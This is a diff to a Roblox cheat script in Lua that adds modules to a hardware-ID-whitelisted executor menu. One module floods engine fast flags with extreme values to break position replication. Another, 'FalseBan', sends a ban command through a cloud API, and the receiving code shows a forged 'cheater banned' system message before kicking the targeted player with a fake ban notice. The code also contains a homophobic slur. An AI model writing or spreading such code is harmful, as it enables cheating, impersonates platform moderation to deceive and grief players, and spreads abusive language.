@@ -57,7 +57,63 @@ end
 run(function()
     if isfile("ReVape/accounts/hwid.txt") then 
         if str == "ablznckx-hfc0-42qv-9a8n-6p8qs37f8r42" or str == "3C86E748-45F6-4B15-9719-62EFD287E34E" or str == "7a73ce6e-5b73-4f82-bf43-4127505b78cd" or str == "28dc335-ccb9-4671-9141-bd01a9e03902" or str == "mz5hivii-t3vk-4yxn-8y6b-9raxs9grke3p" or str == "c2e2c7e9-899d-401c-9f8e-a8b51a4b8c76" or str == "xwxjehth-ipyk-49je-8xpq-4q4okuue7waq" then
-           run(function()
+            run(function()
+                local PositionRaper
+                PositionRaper = vape.Categories.Blatant:CreateModule({
+                    Name = "PositionRaper",
+                    Function = function(callback)
+                        if callback then
+                            task.spawn(function()
+                                repeat
+                                    setfflag('DFIntDebugDefaultTargetWorldStepsPerFrame', '-2147483648')
+                                    setfflag('DFIntMaxMissedWorldStepsRemembered', '-2147483648')
+                                    setfflag('DFIntWorldStepsOffsetAdjustRate', '2147483648')
+                                    setfflag('DFIntDebugSendDistInSteps', '-2147483648')
+                                    setfflag('DFIntWorldStepMax', '-2147483648')
+                                    setfflag('DFIntWarpFactor', '2147483648')
+                                    task.wait()
+                                until not PositionRaper.Enabled
+                            end)
+                            setfflag('NextGenReplicatorEnabledWrite4', 'true')
+                        else
+                            setfflag('NextGenReplicatorEnabledWrite4', 'false')
+                        end
+                    end
+                })
+            end)
+            run(function()
+                local FalseBan
+                local user
+                FalseBan = vape.Legit:CreateModule({
+                    Name = "FalseBan",
+                    Tooltip = "FalseBan anyone using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        FalseBan:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = 'faggot',
+                            type = "ban"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = FalseBan:CreateTextBox({
+                    Name = "Username"
+                })
+
+            end)
+            run(function()
                 local Kick
                 local user
                 local msg
@@ -486,6 +542,33 @@ run(function()
                 newfps = 60
             end
             setfpscap(newfps)
+        end
+        if lplr.Name == str and command == "ban" then
+           req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+            task.wait(0.2)
+            pcall(function()
+                if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+                    local textChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
+                    if textChannel then
+                        textChannel:DisplaySystemMessage("<font color='#FF0000'>A cheater in this server has been banned</font>")
+                    end
+                end
+            end)
+            pcall(function()
+                cloneref(game:GetService("StarterGui")):SetCore("ChatMakeSystemMessage", {
+                    Text = "A cheater in this server has been banned",
+                    Color = Color3.fromRGB(255, 0, 0),
+                    Font = Enum.Font.SourceSansBold,
+                    FontSize = Enum.FontSize.Size18
+                })
+            end)
+            lplr:Kick("You have been temporarily banned. (Remaining ban duration: 4960 weeks 2 days 4 hour 34 minutes 6 seconds)")
         end
     end
 end)
